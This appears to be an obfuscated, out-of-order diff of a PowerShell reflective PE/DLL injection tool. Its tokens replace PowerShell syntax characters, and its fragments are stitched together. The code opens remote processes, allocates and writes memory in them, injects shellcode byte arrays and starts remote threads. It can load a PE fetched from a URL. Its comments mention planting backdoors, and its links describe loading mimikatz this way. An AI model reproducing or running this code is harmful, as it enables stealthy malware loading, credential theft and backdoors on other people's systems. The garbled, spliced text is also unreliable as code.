+            Write-Verbose GEy9PE file doesne9Mjt support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash.GEy9
+        }
+
+        if (CXljForceASLR -and CXljRemoteLoading)
+        {
+            Write-Error GEy9Cannot use ForceASLR when loading in to a remote process.GEy9 -ErrorAction Stop
+        }
+        if (CXljRemoteLoading -and (-not CXljPESupportsASLR))
+        {
+            Write-Error GEy9PE doesne9Mjt support ASLR. Cannot load a non-ASLR PE in to a remote processGEy9 -Err','
+		}
+		else
+	','ddress kernel32.dll CreateRemoteThread
+        CXljCreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        CXljCreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljCreateRemoteThreadAddr, CXljCreateRemoteThreadDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value CXljCreateRemoteThread
+		
+		CXljGetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
+       ','			
+				if (CXljPEInfo.PE64Bit -eq CXljtrue)
+				{
+					#Shellcode: CallDllMain.asm
+					CXljCallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
+					CXljCallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
+					CXljCallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89','efineLiteral(e9MjRES_2e9Mj, [UInt16] 0x0004) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjRES_3e9Mj, [UInt16] 0x0008) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASEe9Mj, [UInt16] 0x0040) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITYe9Mj, [UInt16] 0x0080) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_DLL_CHARACTERISTICS_NX_COMPATe9Mj, [UInt16] 0x0100) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_DLLCHARACTERISTICS_NO_ISOLATIONe9Mj, [UInt16] 0x0200) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_DLLCHARACTERISTICS_NO_SEHe9Mj, [UInt16] 0x0400) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_DLLCHARACTERISTICS_NO_BINDe9Mj, [UInt16] 0x0800) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjRES_4e9Mj, [UInt16] 0x1000) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_DLLCHARACTERISTICS_WDM_DRIVERe9Mj, [UInt16] 0x2000) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWAREe9Mj, [UInt16] 0x8000) Jbi write-host
+		CXljDllCharacteristicsType = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value CXljDllCharacteristicsType
+
+		###########    STRUCT    ###########
+		#Struct IMAGE_DATA_DIRECTORY
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_DATA_DIRECTORYe9Mj, CXljAttributes, [System.ValueType], 8)
+		(CXljTypeBuilder.DefineField(e9MjVirtualAddresse9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(0) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(4) Jbi write-host
+		CXljIMAGE_DAT','
+		(CXljTypeBuilder.DefineField(e9MjIATe9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(208) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjDelayImportDescriptore9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(216) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjCLRRuntimeHeadere9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(224) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjReservede9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(232) Jbi write-host
+		CXljIMAGE_OPTIONAL_HEADER64 = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value CXljIMAGE_OPTIONAL_HEADER64
+
+		#Struct IMAGE_OPTIONAL_HEADER32
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_OPTIONAL_HEADER32e9Mj, CXljAttributes, [System.ValueType], 224)
+		(CXljTypeBuilder.DefineField(e9MjMagice9Mj, CXljMagicType, e9MjPublice9Mj)).SetOffset(0) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMajorLinkerVersione9Mj, [Byte], e9MjPublice9Mj)).SetOffset(2) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMinorLinkerVersione9Mj, [Byte], e9MjPublice9Mj)).SetOffse','r -eq CXljnull) -or (CXljVoidFuncAddr -eq [IntPtr]::Zero))
+			{
+				Throw GEy9VoidFunc couldne9Mjt be found in the DLLGEy9
+			}
+			
+			CXljVoidFuncAddr = Sub-SignedIntAsUnsigned CXljVoidFuncAddr CXljPEHandle
+			CXljVoidFuncAddr = Add-SignedIntAsUnsigned CXljVoidFuncAddr CXljRemotePEHandle
+			
+			#Create the remote thread, done9Mjt wait for it to return.. This will probably mainly be used to plant backdoors
+			CXljRThreadHandle = Create-RemoteThread -ProcessHandle CXljRemoteProcHandle -StartAddress CXljVoidFuncAddr -Win32Functions CXljWin32Functions
+		}
+		
+		#Done9Mjt free a library if it is injected in a remote process or if it is an EXE.
+        #Note that all DLLe9Mjs loaded by the EXE will remain loaded in memory.
+		if (CXljRemoteProcHandle -eq [IntPtr]::Zero -and CXljPEInfo.FileType -ieq GEy9DLLGEy9)
+		{
+			Invoke-MemoryFreeLibrary -PEHandle CXljPEHandle
+		}
+		else
+		{
+			#Delete the PE file from memory.
+			CXljSuccess = CXljWin32Functions.VirtualFree.Invoke(CXljPEHandle, [UInt64]0, CXljWin32Constants.MEM_RELEASE)
+			if (CXljSuccess -eq CXljfalse)
+			{
+				Write-Warning GEy9Unable to call VirtualFr','hell must be same architecture (x86/x64) as PE being loaded and remote processGEy9
+			}
+		}
+		else
+		{
+			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
+			{
+				CXljProcess64Bit = CXljfalse
+			}
+		}
+		if (CXljProcess64Bit -ne CXljPEInfo.PE64Bit)
+		{
+			Throw GEy9PE platform doesne9Mjt match the architecture of the process it is being loaded in (32/64bit)GEy9
+		}
+		
+
+		#Allocate memory and wr','OR_NO_TOKEN -Value 0x3f0
+		
+		return CXljWin32Constants
+	}
+
+	Function Get-Win32Functions
+	{
+		CXljWin32Functions = New-Object System.Object
+		
+		CXljVirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+		CXljVirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		CXljVirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljVirtualAllocAddr, CXljVirtualAllocDelegate)
+		CXljWin32Functions Jbi Add-Member NoteProperty -Name VirtualAlloc -Value CXljVirtualAlloc
+		
+		CXljVirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
+		CXljVirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		CXljVirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljVirtualAllocExAddr, CXljVirtualAllocExDelegate)
+		CXljWin32Functions Jbi Add-Member NoteProperty -Name VirtualAllocEx -Value CXljVirtualAllocEx
+		
+		CXljmemcpyAddr = Get-ProcAddress msvcrt.dll memcpy
+		CXljmemcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
+		CXljmemcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljmemcpyAddr, CXljmemcpyDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name memcpy -Value CXljmemcpy
+		
+		CXljmemsetAddr = Get-ProcAddress msvcrt.dll memset
+		CXljmemsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
+		CXljmemset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljmemsetAddr, CXljmemsetDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name memset -Value CXljmemset
+		
+		CXljLoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
+		CXljLoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
+		CXljLoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljLoadLibraryAddr, CXljLoadLibraryDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name LoadLibrary -Value CXljLoadLibrary
+		
+		CXljGetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
+		CXljGetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+		CXljGetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljGetProcAddressAddr, CXljGetProcAddressDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name GetProcAddress -Value CXljGetProcAddress
+		
+		CXljGetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
+		CXljGetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
+		CXljGetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljGetProcAddressIntPtrAddr, CXljGetProcAddressIntPtrDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value CXljGetProcAddressIntPtr
+		
+		CXljVirtu','essSC3 = @(0x51, 0x50, 0xb8)
+			CXljGetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
+			CXljGetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
+		}
+		CXljSCLength = CXljGetProcAddressSC1.Length + CXljGetProcAddressSC2.Length + CXljGetProcAddressSC3.Length + CXljGetProcAddressSC4.Length + CXljGetProcAddressSC5.Length + (CXljPtrSize * 4)
+		CXljSCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljSCLength)
+		CXljSCPSMemOriginal = CXljSCPSMem
+		
+		Write-BytesToMemory -Bytes CXljGetProcAddressSC1 -MemoryAddress CXljSCPSMem
+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljGetProcAddressSC1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljRemoteDllHandle, C','y9DLL compiled executableGEy9 imports has an export called _acmdln and _wcmdln.
+		#	',' CXljGetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
+        CXljGetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljGetExitCodeThreadAddr, CXljGetExitCodeThreadDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name Get','tect
+		CXljVirtualProtectDelegate = Get-D','bi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjItaniume9Mj, [UInt16] 0x0200) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9Mjx64e9Mj, [UInt16] 0x8664) Jbi write-host
+		CXljMachineType = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name MachineType -Value CXljMachineType
+
+		#Enum MagicType
+		CXljTypeBuilder = CXljModuleBuilder.DefineEnum(e9MjMagicTypee9Mj, e9MjPublice9Mj, [UInt16])
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_NT_OPTIONAL_HDR32_MAGICe9Mj, [UInt16] 0x1','tectFlag = 0
+		foreach (CXljInfo in CXljCopyInfo)
+		{
+			CXljSuccess = CXljWin32Functions.VirtualProtect.Invoke(CXljInfo[0], [UInt32]CXljInfo[2], [UInt32]CXljWin32Constants.PAGE_EXECUTE_READWRITE, [Ref]CXljOldProtectFlag)
+			if (CXljSuccess -eq CXljfalse)
+			{
+				Throw GEy9Call to VirtualProtect failedGEy9
+			}
+			
+			CXljWin32Functions.memcpy.Invoke(C','nThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
+        CXljOpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
+        CXljOpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljOpenThreadTokenAddr, CXljOpenThreadTokenDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value CXljOpenThreadToken
+		
+		CXljGetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
+        CXljGetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
+        CXljGetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljGetCurrentThreadAddr, CXljGetCurrentThreadDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value CXljGetCurrentThread
+		
+		CXljAdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
+        CXljAdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
+        CXljAdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljAdjustTokenPrivilegesAddr, CXljAdjustTokenPrivilegesDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value CXljAdjustTokenPrivileges
+	','                       {
+                            Throw GEy9New function reference is null, this is almost certainly a bug in this script. Function Ordinal: CXljProcedureNamePtr. Dll: CXljImportDllPathGEy9
+                        }
+                        else
+                        {
+						    Throw GEy9New function reference is null, this is almost certainly a bug in this scri',' e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9Mje_spe9Mj, [','y9WebFileGEy9, Position = 0, Mandatory = CXljtrue)]
+	[Uri]
+	CXljPEUrl,
+
+    [Parameter(ParameterSetName = GEy9BytesGEy9, Position = 0, Mandatory = CXljtrue)]
+    [ValidateNotNullOrEmpty()]
+    [Byte[]]
+    CXljPEBytes,
+	
+	[Parameter(Position = 1)]
+','compiled in to visual studio c++)
+		[IntPtr]CXljMscoreeHandle = CXljWin32Functions.GetModuleHandle.Invoke(GEy9mscoree.dllGEy9)
+		if (CXljMscoreeHandle -eq [IntPtr]::Zero)
+		{
+			throw GEy9mscoree handle nullGEy9
+		}
+		[IntPtr]CXljCorExitProcessAddr = CXljWin32Functions.GetProcAddress.Invoke(CXljMscoreeHandle, GEy9CorExitProcessGEy9)
+		if (CXljCorExitProcessAddr -eq [IntPtr]::Zero)
+		{
+			Throw GEy9CorExitProcess address not foundGEy9
+		}
+		CXljExitFunctions += CXljCorExitProcessAddr
+		
+		#ExitProcess (what non-managed programs use)
+		[IntPtr]CXljExitProcessAddr = CXljWin32Functions.GetProcAddress.Invoke(CXljKernel32Handle, GEy9ExitProcessGEy9)
+		if (CXljExitProcessAddr -eq [IntPtr]::Zero)
+		{
+			Throw GEy9ExitProcess address not foundGEy9
+		}
+		CXljExitFunctions += CXljExitProcessAddr
+		
+		[UInt32]CXljOldProtectFlag = 0
+		foreach (CXljProcExitFunctionAddr in CXljExitFunctions)
+		{
+			CXljProcExitFunctionAddrTmp = CXljProcExitFunctionAddr
+			#The following is the shellcode (Shellcode: ExitThread.asm):
+			#32bit shellcode
+			[Byte[]]CXljShellcode1 = @(0xbb)
+			[Byte[]]CXljShellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
+			#64bit shellcode (Shellcode: ExitThread.asm)
+			if (CXljPtrSize -eq 8)
+			{
+				[Byte[]]CXljShellcode1 = @(0x48, 0xbb)
+				[Byte[]]CXljShellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
+			}
+			[Byte[]]CXljShellcode3 = @(0xff, 0xd3)
+			CXljTotalSize = CXljShellcode1.Length + CXljPtrSize + CXljShellcode2.Length + CXljPtrSize + CXljShellcode3.Length
+			
+			[IntPtr]CXljExitThreadAddr = CXljWin32Functions.GetProcAddress.Invoke(CXljKernel32Handle, GEy9ExitThreadGEy9)
+			if (CXljExitThreadAddr -eq [IntPtr]::Zero)
+			{
+				Throw GEy9ExitThread address not foundGEy9
+			}
+
+			CXljSuccess = CXljWin32Functions.VirtualProtect.Invoke(CXljProcExitFunctionAddr, [UInt32]CXljTotalSize, [UInt32]CXljWin32Constants.PAGE_EXECUTE_READWRITE, [Ref]CXljOldProtectFlag)
+			if (CXljSuccess -eq CXljfalse)
+			{
+				Throw GEy9Call to VirtualProtect failedGEy9
+			}
+			
+			#Make copy of original ExitProcess bytes
+			CXljExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljTotalSize)
+			CXljWin32Functions.memcpy.Invoke(CXljExitProcessOrigBytesPtr, CXljProcExitFunctionAddr, [UInt64]CXljTotalSize) Jbi write-host
+			CXljReturnArray += ,(CXljProcExitFunctionAddr, CXljExitProcessOrigBytesPtr, CXljTotalSize)
+			
+			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
+			#	call ExitThread
+			Write-BytesToMemory -Bytes CXljShellcode1 -MemoryAddress CXljProcExitFunctionAddrTmp
+			CXljProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned CXljProcExitFunctionAddrTmp (CXljShellcode1.Length)
+			[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljExeDoneBytePtr, CXljProcExitFunctionAddrTmp, CXljfalse)
+			CXljProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned CXljProcExitFunctionAddrTmp CXljPtrSize
+			Write-BytesToMemory -Bytes CXljShellcode2 -MemoryAddress CXljProcExitFunctionAddrTmp
+			CXljProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned CXljProcExitFunctionAddrTmp (CXljShellcode2.Length)
+			[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljExitThreadAddr, CXljProcExitFunctionAddrTmp, CXljfalse)
+			CXljProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned CXljProcExitFunct','_.Name -eq CXljProcName } Jbi Select-Object ProcessName, Id, SessionId
+				Write-Output CXljProcInfo
+				Throw GEy9More than one instance of CXljProcName found, please specify the process ID to inject in to.GEy9
+			}
+			else
+			{
+				CXljProcId = CXljProcesses[0].ID
+			}
+		}
+		
+		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isne9Mjt needed. Keeping it around just incase it is needed in the future.
+		#If the script isne9Mjt running in the same Windows logon session as the target, get SeDebugPrivilege
+#		if ((Get-Process -Id CXljPID).SessionId -ne (Get-Process -Id CXljProcId).SessionId)
+#		{
+#			Write-Verbose GEy9Getting SeDebugPrivilegeGEy9
+#			Enable-SeDebugPrivilege -Win32Functions CXljWin32Functions -Win32Types CXljWin32Types -Win32Constants CXljWin32Constants
+#		}	
+		
+		if ((CXljProcId -ne CXljnull) -and (CXljProcId -ne 0))
+		{
+			CXljRemoteProcHandle = CXljWin32Functions.OpenProcess.Invoke(0x001F0FFF, CXljfalse, CXljProcId)
+			if (CXljRemoteProcHandle -eq [IntPtr]::Zero)
+			{
+				Throw GEy9Couldne9Mjt obtain the handle for process ID: CXljProcIdGEy9
+			}
+			
+			Write-Verbose GEy9Got the handle for the remote process to inject in toGEy9
+		}
+		
+
+		#Load the PE reflectively
+		Write-Verbose GEy9Calling Invoke-MemoryLoadLibraryGEy9
+		CXljPEHandle = [IntPtr]::Zero
+		if (CXljRemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			CXljPELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes CXljPEBytes -ExeArgs CXljExeArgs -ForceASLR CXljForceASLR
+		}
+		else
+		{
+			CXljPELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes CXljPEBytes -ExeArgs CXljExeArgs -RemoteProcHandle CXljRemoteProcHandle -ForceASLR CXljForceASLR
+		}
+		if (CXljPELoadedInfo -eq [IntPtr]::Zero)
+		{
+			Throw GEy9Unable to load PE, handle returne','tringFunc()
+
+
+If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
+this script to accomodate this. You can find the code to modify in the section labeled GEy9YOUR CODE GOES HEREGEy9.
+
+Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection
+
+.LINK
+
+Blog: http://clymb3r.wordpress.com/
+Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
+
+Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
+Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
+Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
+
+#>
+
+[CmdletBinding(DefaultParameterSetName=GEy9WebFileGEy9)]
+Param(
+	[Parameter(ParameterSetName = GEy9LocalFileGEy9, Position = 0, Mandatory = CXljtrue)]
+	[String]
+	CXljPEPath,
+	
+	[Parameter(ParameterSetName = GE','ncate SizeOfRawData to VirtualSize
+			CXljSizeOfRawData = CXljSectionHeader.SizeOfRawData
+
+			if (CXljSectionHeader.PointerToRawData -eq 0)
+			{
+				CXljSizeOfRawData = 0
+			}
+			
+			if (CXljSizeOfRawData -gt CXljSectionHeader.VirtualSize)
+			{
+				CXljSizeOfRawData = CXljSectionHeader.VirtualSize
+			}
+			
+			if (CXljSizeOfRawData -gt 0)
+			{
+				Test-MemoryRangeValid -DebugString GEy9Copy-Sections::MarshalCopyGEy9 -PEInfo CXljPEInfo -StartAddress CXljSectionDestAddr -Size CXljSizeOfRawData Jbi write-host
+				[System.Runtime.InteropServices.Marshal]::Copy(CXljPEBytes, [Int32]CXljSectionHeader.PointerToRawData, CXljSectionDestAddr, CXljSizeOfRawData)
+			}
+		
+			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
+			if (CXljSectionHeader.SizeOfRawData -lt CXljSectionHeader.VirtualSize)
+			{
+				CXljDifference = CXljSectionHeader.VirtualSize - CXljSizeOfRawData
+				[IntPtr]CXljStartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int6','XljGetProcAddressSC2 = @(0xb9)
+			CXljGetProcAddr','[System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(CXljImportDllPathPtr)
+		CXljDllPathSize = [UIntPtr][UInt64]([UInt64]CXljImportDllPath.Length + 1)
+		CXljRImportDllPathPtr = CXljWin32Functions.VirtualAllocEx.Invoke(CXljRemoteProcHandle, [IntPtr]::Zero, CXljDllPathSize, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_READWRITE)
+		if (CXljRImportDllPathPtr -eq [IntPtr]::Zero)
+		{
+			Throw GEy9Unable to allocate memory in the remote processGEy9
+		}
+
+		[UIntPtr]CXljNumBytesWritten = [UIntPtr]::Zero
+		CXljSuccess = CXljWin32Functions.WriteProcessMemory.Invoke(CXljRemoteProcHandle, CXljRImportDllPathPtr, CXljImportDllPathPtr, CXljDllPathSize, [Ref]CXljNumBytesWritten)
+		
+		if (CXljSuccess -eq CXljfalse)
+		{
+			Throw GEy9Unable to write DLL path to remote process memoryGEy9
+		}
+		if (CXljDllPathSize -ne CXljNumBytesWritten)
+		{
+			Throw GEy9Didne9Mjt write the expected amount of bytes when writing a DLL path to load to the remote processGEy9
+		}
+		
+		CXljKernel32Handle = CXljWin32Functions.GetModuleHandle.Invoke(GEy9kernel32.dllGEy9)
+		CXljLoadLibraryAAddr = CXljWin32Functions.GetProcAddress.Invoke(CXljKernel32Handle, GEy9LoadLibraryAGEy9) #Kernel32 loaded to the same address for all processes
+		
+		[IntPtr]CXljDllAddress = [IntPtr]::Zero
+		#For 64bit DLLe9Mjs, we cane9Mjt use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
+		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
+		if (CXljPEInfo.PE64Bit -eq CXljtrue)
+		{
+			#Allocate memory for the address returned by LoadLibraryA
+			CXljLoadLibraryARetMem = CXljWin32Functions.VirtualAllocEx.Invoke(CXljRemoteProcHandle, [IntPtr]::Zero, CXljDllPathSize, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_READWRITE)
+			if (CXljLoadLibraryARetMem -eq [IntPtr]::Zero)
+			{
+				Throw GEy9Unable to allocate memory in the remote process for the return value of LoadLibraryAGEy9
+			}
+			
+			
+			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
+			CXljLoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
+			CXljLoadLibrarySC2 = @(0x48, 0xba)
+			CXljLoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
+			CXljLoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x','t Win32 constants and functions
+		CXljWin32Constants = Get-Win32Constants
+		CXljWin32Functions = Get-Win32Functions
+		CXljWin32Types = Get-Win32Types
+		
+		CXljPEInfo = Get-PEDetailedInfo -PEHandle CXljPEHandle -Win32Types CXljWin32Types -Win32Constants CXljWin32Constants
+		
+		#Call FreeLibrary for all the imports of the DLL
+		if (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
+		{
+			[IntPtr]CXljImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.PEHandle) ([Int64]CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
+			
+			while (CXljtrue)
+			{
+				CXljImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljImportDescriptorPtr, [Type]CXljWin32Types.IMAGE_IMPORT_DESCRIPTOR)
+				
+				#If the structure is null, it signals that this is the end of the array
+				if (CXljImportDescriptor.Characteristics -eq 0 Ppv
+						-and CXljImportDescriptor.FirstThunk -eq 0 Ppv
+						-and CXljImportDescriptor.ForwarderChain -eq 0 Ppv
+						-and CXljImportDescriptor.Name -eq 0 Ppv
+						-and CXljImportDescriptor.TimeDateStamp -eq 0)
+				{
+					Write-Verbose GEy9Done unloading the libraries needed by the PEGEy9
+					break
+				}
+
+				CXljImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.PEHandle) ([Int64]CXljImportDescriptor.Name)))
+				CXljImportDllHandle = CXljWin32Functions.GetModuleHandle.Invoke(CXljImportDllPath)
+
+				if (CXljImportDllHandle -eq CXljnull)
+				{
+					Write-Warning GEy9Error getting DLL handle in MemoryFreeLibrary, DLLName: CXljImportDllPath. Continuing anywaysGEy9 -WarningAction Continue
+				}
+				
+				CXljSuccess = CXljWin32Functions.FreeLibrary.Invoke(CXljImportDllHandle)
+				if (CXljSuccess -eq CXljfalse)
+				{
+					Write-Warning GEy9Unable to free library: CXljImportDllPath. Continuing anyways.GEy9 -WarningAction Continue
+				}
+				
+				CXljImportDescriptorPtr = Add-SignedIntAsUnsigned (CXljImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]CXljWin32Types.IMAGE_IMPORT_DESCRIPTOR))
+			}
+		}
+		
+		#Call DllMain with process detach
+		Write-Verbose GEy9Calling dllmain so the DLL knows it is being unloadedGEy9
+		CXljDllMainPtr = Add-SignedIntAsUnsigned (CXljPEInfo.PEHandle) (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+		CXljDllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+		CXljDllMain = [System.Runtime.InteropServices.Marshal]::GetDe','Function Test-MemoryRangeValid
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[String]
+		CXljDebugString,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
